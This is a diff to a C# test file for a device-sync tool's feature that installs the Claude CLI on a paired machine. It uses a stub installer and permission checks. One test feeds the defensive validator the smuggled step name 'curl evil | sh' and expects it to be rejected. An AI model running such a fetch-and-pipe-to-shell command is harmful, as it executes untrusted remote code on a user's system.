@@ -58,27 +58,74 @@ public sealed class ClaudeTests : IAsyncLifetime
         return script;
     }
 
-    private async Task<PairSyncCore> StartAsync(string name, bool withCli = true)
+    /// <param name="installable">No CLI yet, but a fake installer that puts one into ~/.local/bin; the machine's own PATH is ignored.</param>
+    private async Task<PairSyncCore> StartAsync(string name, bool withCli = true, bool installable = false)
     {
         var options = new ClaudeOptions
         {
             HomeDir = Home(name),
             ConfigDir = ConfigDir(name),
             GlobalConfigFile = Path.Combine(Home(name), ".claude.json"),
-            Executable = withCli ? FakeCli(name) : "",
+            Executable = installable ? null : withCli ? FakeCli(name) : "",
+            SearchSystemPath = !installable,
             StepTimeout = TimeSpan.FromSeconds(30),
         };
         Directory.CreateDirectory(options.ConfigDir);
-        var core = await TestCores.StartAsync(new DataDirectory(Path.Combine(_root.FullName, name, "data")), Ct, claude: options);
+        var installer = installable
+            ? new ClaudeInstallerOptions
+            {
+                ScriptUri = new Uri("https://claude.example/install"),
+                Handler = new ScriptHandler(FakeInstaller),
+                UserPath = _paths,
+                Environment = new Dictionary<string, string> { ["USERPROFILE"] = Home(name), ["HOME"] = Home(name) },
+            }
+            : null;
+        var core = await TestCores.StartAsync(new DataDirectory(Path.Combine(_root.FullName, name, "data")), Ct, claude: options,
+            claudeInstaller: installer);
         core.Settings.Update(s => s with { DeviceName = name });
         _cores.Add(core);
         return core;
     }
 
-    private async Task<(PairSyncCore Source, PairSyncCore Target)> StartPairAsync(bool targetCli = true)
+    private readonly RecordingPath _paths = new();
+
+    /// <summary>Stands in for the official installer: a claude program in ~/.local/bin.</summary>
+    private static string FakeInstaller => OperatingSystem.IsWindows()
+        ? """
+          $bin = Join-Path $env:USERPROFILE '.local\bin'
+          New-Item -ItemType Directory -Force $bin | Out-Null
+          Copy-Item (Join-Path $env:SystemRoot 'System32\whoami.exe') (Join-Path $bin 'claude.exe')
+          Write-Output 'Claude Code successfully installed!'
+          """
+        : """
+          #!/bin/sh
+          mkdir -p "$HOME/.local/bin"
+          printf '#!/bin/sh\necho "2.1.300 (Claude Code)"\n' > "$HOME/.local/bin/claude"
+          chmod +x "$HOME/.local/bin/claude"
+          echo 'Claude Code successfully installed!'
+          """;
+
+    private sealed class ScriptHandler(string script) : HttpMessageHandler
+    {
+        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
+            Task.FromResult(new HttpResponseMessage(System.Net.HttpStatusCode.OK) { Content = new StringContent(script) });
+    }
+
+    private sealed class RecordingPath : IUserPath
+    {
+        public List<string> Folders { get; } = [];
+
+        public PathUpdate Ensure(string folder)
+        {
+            Folders.Add(folder);
+            return new PathUpdate(folder, false, ["test"]);
+        }
+    }
+
+    private async Task<(PairSyncCore Source, PairSyncCore Target)> StartPairAsync(bool targetCli = true, bool installable = false)
     {
         var source = await StartAsync("laptop");
-        var target = await StartAsync("office", targetCli);
+        var target = await StartAsync("office", targetCli, installable);
         await TestCores.PairAsync(source, target, Ct);
         TestCores.MakeReachable(source, target);
         TestCores.MakeReachable(target, source);
@@ -278,5 +325,70 @@ public sealed class ClaudeTests : IAsyncLifetime
             }
         }
         Assert.False(File.Exists(Path.Combine(ConfigDir("office"), "settings.json")));
+    }
+    [Fact]
+    public async Task Missing_claude_is_installed_on_the_target_before_the_cli_steps()
+    {
+        var (source, target) = await StartPairAsync(installable: true);
+        await AllowAsync(target, source, programs: true);
+        WriteSourceConfig();
+
+        var fetched = await FetchAsync(source);
+        Assert.True(fetched.CanInstallClaude);
+        Assert.Null(fetched.Snapshot.Version);
+        var plan = ClaudePlanner.Plan(await source.Claude.ReadLocalAsync(Ct), fetched.Snapshot, fetched.CanInstallClaude);
+        var request = ClaudePlanner.BuildApply(plan, new ClaudeSelection(
+            new HashSet<string>(), new HashSet<string> { ClaudePlanner.InstallClaudeId, "plugin:good@m" }, new Dictionary<string, string>()));
+        var results = new List<ClaudeStepResult>();
+        await source.Claude.ApplyAsync(fetched.Device, request, results.Add, Ct);
+
+        var install = results.Single(r => r.Index == 0);
+        Assert.Equal(ClaudeStepStatus.Done, install.Status);
+        Assert.Contains("successfully installed", install.Output, StringComparison.Ordinal);
+        Assert.Equal([Path.Combine(Home("office"), ".local", "bin")], _paths.Folders);
+        Assert.True(target.Claude.IsInstalledLocally);
+        // The CLI steps ran right away instead of waiting.
+        Assert.DoesNotContain(results, r => r.Status == ClaudeStepStatus.Pending);
+        Assert.Null(target.Claude.Pending);
+    }
+
+    [Fact]
+    public async Task Install_step_needs_install_programs()
+    {
+        var (source, target) = await StartPairAsync(installable: true);
+        await AllowAsync(target, source, programs: false);
+
+        var fetched = await FetchAsync(source);
+        var plan = ClaudePlanner.Plan(await source.Claude.ReadLocalAsync(Ct), fetched.Snapshot, fetched.CanInstallClaude);
+        var request = ClaudePlanner.BuildApply(plan, new ClaudeSelection(
+            new HashSet<string>(), new HashSet<string> { ClaudePlanner.InstallClaudeId }, new Dictionary<string, string>()));
+        var results = new List<ClaudeStepResult>();
+        await source.Claude.ApplyAsync(fetched.Device, request, results.Add, Ct);
+
+        Assert.Equal(ClaudeStepStatus.Skipped, Assert.Single(results).Status);
+        Assert.Empty(_paths.Folders);
+        Assert.False(target.Claude.IsInstalledLocally);
+    }
+
+    [Fact]
+    public async Task Claude_is_installed_on_this_device_from_the_page()
+    {
+        var core = await StartAsync("office", installable: true);
+        Assert.False(core.Claude.IsInstalledLocally);
+
+        var result = await core.Claude.InstallLocalAsync(Ct);
+
+        Assert.True(result.Success, result.Error);
+        Assert.True(core.Claude.IsInstalledLocally);
+        Assert.Single(_paths.Folders);
+    }
+
+    [Fact]
+    public void Target_accepts_only_the_known_install_step()
+    {
+        Assert.Equal(ClaudeStepKind.InstallClaude,
+            Assert.Single(ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 5, Name = "claude-code" }])).Kind);
+        Assert.Throws<ClaudeApplyRejectedException>(() => ClaudeApplier.CheckSteps([new ClaudeStepEntry { Kind = 5, Name = "curl evil | sh" }]));
+        Assert.True(ClaudeApplier.RunsPrograms(new ClaudeStep(ClaudeStepKind.InstallClaude, "claude-code", null, null)));
     }
 }
